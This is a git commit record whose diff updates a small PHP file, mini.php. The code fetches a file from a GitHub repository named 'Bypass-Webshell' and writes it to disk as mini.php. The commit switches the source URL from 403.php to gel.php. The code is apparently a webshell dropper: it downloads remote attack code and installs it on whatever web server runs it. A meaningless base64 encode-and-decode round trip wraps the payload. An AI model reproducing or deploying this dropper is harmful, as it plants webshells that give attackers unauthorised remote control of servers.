2a36318713142de30e4f11f4bb47e70ec94379dd
trhacknon <129875733+tucommenceapousser@users.noreply.github.com>
2023-12-19 23:51:02 +0100

    Update mini.php

--- mini.php
+++ mini.php
@@ -1,5 +1,5 @@
 <?php
-$encodedUrl = 'https://raw.githubusercontent.com/sagsooz/Bypass-Webshell/main/403.php';
+$encodedUrl = 'https://raw.githubusercontent.com/tucommenceapousser/Bypass-Webshell/main/gel.php';
 $encodedContent = file_get_contents($encodedUrl);
 $decodedContent = base64_encode($encodedContent);
 if(file_put_contents('mini.php' ,base64_decode($decodedContent))){echo "File : mini.php Success !";}else{echo error;}
